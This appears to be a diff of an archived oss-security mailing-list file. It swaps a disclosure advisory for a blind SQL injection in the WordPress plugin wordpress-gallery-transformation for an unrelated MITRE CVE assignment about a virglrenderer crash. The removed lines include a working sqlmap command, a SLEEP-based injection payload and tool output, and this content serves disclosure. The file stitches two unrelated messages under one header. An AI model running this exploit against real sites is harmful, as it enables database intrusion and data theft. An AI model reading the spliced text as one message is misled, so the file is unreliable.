@@ -1,55 +1,47 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/25/2
-Message-id: <29FBF111-3395-49B0-8A35-4E6D36963175@me.com>
-Date: Fri, 25 Aug 2017 12:03:02 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/09/4
+Message-ID: <c71c229030bc42aa80a7bf11d56f215e@imshyb02.MITRE.ORG>
+Date: Wed, 8 Feb 2017 23:58:06 -0500
+From: <cve-assign@...re.org>
+To: <ppandit@...hat.com>
+CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <liq3ea@...il.com>
+Subject: Re: CVE request virglrenderer: null pointer dereference in vrend_clear
 Content-Type: text/plain; charset=utf-8
 
-Title: Authenticated Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-07-22
-CVE-ID:[CVE-2017-1002028]
-Download Site: https://wordpress.org/plugins/wordpress-gallery-transformation/
-Vendor: http://angrybyte.com
-Vendor Notified: 2017-08-07
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=199
-Description: Transforms word press into a gallery, wallpapers website, you name it.
-Vulnerability:
-SQL injection is in ./wordpress-gallery-transformation/gallery.php via $jpic parameter being unsanitized before being passed into an SQL query.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
---
-231-
-232- $pfx=$wpdb->prefix;
-233-dbcreator();
-234- if($_GET['picnj']){
-235-
-236: $jpic=$_GET['picnj'];
-237: $jnm=$_GET['nmj'];
-238- $wpdb->query("update {$pfx}gallery set name='{$jnm}' where id=$jpic;");
-239- $wpdb->query("update {$pfx}gallery set rates=44");
-240- return 'ok?';
+> Virgil 3d project, used by Quick Emulator(Qemu) to implement 3D GPU support
+> for the virtio GPU, is vulnerable to a null pointer dereference issue. It
+> could occur when a guest invokes a virgl 'VIRGL_CCMD_CLEAR' command.
+> 
+> A guest user/process could use this flaw to crash Qemu process resulting in
+> DoS.
+> 
+> https://cgit.freedesktop.org/virglrenderer/commit/?id=48f67f60967f963b698ec8df57ec6912a43d6282
+> https://bugzilla.redhat.com/show_bug.cgi?id=1420246
 
-The attacker will need to be logged in and able to manage the gallery in order to exploit.
+Use CVE-2017-5937.
 
-Exploit Code:
-	• $ sqlmap --load-cookies=./cookie -u 'http://example.com/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=*' --level 4 --risk 3 --dbms mysql
-	•  
-	•  
-	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-	• sqlmap identified the following injection point(s) with a total of 2556 HTTP(s) requests:
-	• ---
-	• Parameter: #1* (URI)
-	•    Type: AND/OR time-based blind
-	•    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•    Payload: http://example.com:80/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=(CASE WHEN (4165=4165) THEN SLEEP(5) ELSE 4165 END)
-	• ---
-	• [13:16:53] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [13:16:53] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
-	•  
-	• [*] shutting down at 13:16:53
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJYm/MpAAoJEHb/MwWLVhi2olMP/03Sgb3VBpQscAXgMLt+92R2
+KUi+w+uiGtDsbV4s/P+QQmPyLdACf1hkuKeTxN8/LUGkKDuzQAjnYrsjnXl1blL9
+F5Xgm0vAtTKJhBvaO56rcO8ZjqT/JxVktJ4aBI1MXtcmvY0ARbvA+7EZcMKZfkJQ
+7+THPkMRCWDj+E6SCwGeYM2I4DHlfytQWA+qw3HOMFU8oRoKOCZXkusA+jiuwZ6J
+vXcGTbGEwmiFu9+TLx0okr2L+PpA2m2OwlzbfR8wzfRK9em5GQmKMhCf7hSDcm94
+PlaYVm5XYwLTisZg+D5RUUW7CVHbg/BPyLagPdDZ/ZIe2YshJoC2Y2LAvU7XLgG4
+MhjleujVv8qbKhcG1B6v5nhkOlUrbEPlshsh5Vp8bJAIfG9JBz3R9DvG5kMhGhZm
+FFQY6rWDnCAJ5EAd0GjUqN31smIZvVVSgXhikNtQFFT9MBfDxdtzPzbiIQXM/5kJ
+C2vjAlUhA/9qrrdQhICH0Lt5WzXU9NuNI+/0dAZRcGN8APF4jHfPCki2Dao+i9M/
+n5dyZnocqak9JPS++ACBAxm3h4cvFaKzQMO+somiSpJttqd9li/6HfvZPXHGmUse
+p56y/ooUsUaM6kub22o+kGkVM8qGc/ZEHIcVDNhk87BFxxgFxQ6snJPMgHxHe62G
+5WnbJ/gEBRGS5w9LAKQR
+=aRRv
+-----END PGP SIGNATURE-----
